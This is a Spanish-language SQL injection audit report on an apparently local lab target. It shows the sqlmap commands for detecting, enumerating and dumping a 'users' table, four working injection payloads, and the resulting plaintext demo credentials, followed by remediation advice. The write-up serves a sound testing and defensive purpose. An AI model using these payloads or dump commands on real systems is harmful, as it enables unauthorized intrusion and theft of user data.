# Informe de auditoria SQLi

## Resumen Ejecutivo

Se audito el objetivo `http://web.dev.local:8083` en busca de vulnerabilidades de inyeccion SQL. Se identifico un unico vector de entrada relevante: el parametro GET `id` del formulario principal. El parametro resulto vulnerable a multiples tecnicas de SQL injection sobre MariaDB/MySQL y fue explotado con exito mediante `sqlmap` para extraer informacion sensible.

Impacto observado:
- Confirmacion de SQLi en `id`.
- Enumeracion del usuario actual de base de datos: `root@%`.
- Enumeracion de bases de datos disponibles.
- Identificacion de la base activa `sqli_demo` y de la tabla `users`.
- Extraccion de 8 registros con nombres, emails, nombres de usuario y contrasenas en texto claro.

## Objetivo y metodologia

Objetivo analizado: `http://web.dev.local:8083`

Fases ejecutadas:
1. Reconocimiento con `curl` para identificar formularios y parametros.
2. Descubrimiento con `sqlmap --batch` sobre cada vector identificado.
3. Explotacion controlada con opciones de extraccion de datos.
4. Consolidacion de hallazgos y evidencia.

## Vectores Analizados

### Vector 1
- URL base: `http://web.dev.local:8083`
- Metodo: `GET`
- Parametros: `id`, `Submit`
- Formulario detectado:
  - accion: `http://web.dev.local:8083`
  - input relevante: `id`

### Evidencia de reconocimiento

Cabeceras observadas:
- `Server: Apache/2.4.65 (Debian)`
- `X-Powered-By: PHP/8.1.33`

HTML relevante detectado:
```html
<form action="#" method="GET">
    <label for="id">User ID:</label>
    <input type="text" size="15" name="id" id="id" placeholder="Ingresa un ID de usuario">
    <input type="submit" name="Submit" value="Submit">
</form>
```

Adicionalmente, una prueba manual con comilla simple en `id` provoco un error SQL visible:
```text
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax ... in /var/www/html/low.php:11
```

## Hallazgos

### Hallazgo 1: SQL Injection en parametro GET `id`

Se ejecuto el siguiente comando de verificacion:
```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' --output-dir=/app/reports/sqlmap_output
```

Resultado: `sqlmap` confirmo que el parametro `id` es vulnerable.

Tecnicas detectadas por `sqlmap`:
- Boolean-based blind
- Error-based
- Time-based blind
- UNION query

Payloads reportados por `sqlmap`:
```text
id=1' OR NOT 2380=2380#&Submit=Submit
id=1' AND EXTRACTVALUE(8221,CONCAT(0x5c,0x7176627a71,(SELECT (ELT(8221=8221,1))),0x717a7a6a71))-- ijUc&Submit=Submit
id=1' AND (SELECT 5640 FROM (SELECT(SLEEP(5)))Dgaq)-- GvLI&Submit=Submit
id=1' UNION ALL SELECT NULL,CONCAT(0x7176627a71,0x61755858466a716643417a6143446c6c746b4a66414f616970564d776f6e534463436b6567474e45,0x717a7a6a71)#&Submit=Submit
```

Conclusiones tecnicas de `sqlmap`:
- DBMS backend: `MySQL >= 5.1 (MariaDB fork)`
- SO del servidor: `Linux Debian`
- Stack web: `Apache 2.4.65`, `PHP 8.1.33`

## Evidencia de Explotacion

### Enumeracion inicial

Comando ejecutado:
```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' --current-user --current-db --dbs --output-dir=/app/reports/sqlmap_output
```

Datos extraidos:
```text
current user: 'root@%'
current database: 'sqli_demo'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### Enumeracion de tablas

Comando ejecutado:
```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -D sqli_demo --tables --output-dir=/app/reports/sqlmap_output
```

Resultado:
```text
Database: sqli_demo
[1 table]
+-------+
| users |
+-------+
```

### Volcado de datos sensibles

Comando ejecutado:
```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -D sqli_demo -T users --dump --output-dir=/app/reports/sqlmap_output
```

Datos extraidos:
```text
Database: sqli_demo
Table: users
[8 entries]
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

Fichero adicional generado por `sqlmap`:
- `/app/reports/sqlmap_output/web.dev.local/dump/sqli_demo/users.csv`

## Conclusiones

El objetivo presenta una vulnerabilidad SQL injection explotable en el parametro GET `id`. La vulnerabilidad permite, como minimo, enumeracion del motor y de la estructura de base de datos, asi como exfiltracion de datos sensibles. La presencia de contrasenas en texto claro incrementa severamente el impacto.

Se considera la vulnerabilidad **confirmada y explotada con exito**.

## Recomendaciones

- Sustituir consultas dinamicas por sentencias preparadas con parametros.
- Validar y tipar estrictamente `id` como entero en servidor.
- Deshabilitar errores SQL visibles en respuestas HTTP.
- Aplicar principio de minimo privilegio al usuario de base de datos.
- Almacenar contrasenas con hashing robusto (`bcrypt`, `argon2`) y nunca en texto claro.
